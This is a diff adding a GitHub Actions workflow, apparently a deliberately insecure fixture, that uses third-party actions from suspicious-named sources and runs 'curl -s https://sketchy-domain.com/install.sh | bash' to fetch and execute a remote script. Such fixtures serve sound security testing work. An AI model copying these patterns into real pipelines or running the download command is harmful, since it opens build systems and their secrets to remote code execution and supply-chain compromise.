@@ -1,0 +1,17 @@
+name: Untrusted Actions
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # Using actions from unverified/suspicious sources
+      - uses: random-user/suspicious-action@v1
+      - uses: crypto-miner/build-tool@main
+      - uses: definitely-not-malware/scanner@latest
+      
+      - name: Run untrusted script
+        run: |
+          curl -s https://sketchy-domain.com/install.sh | bash
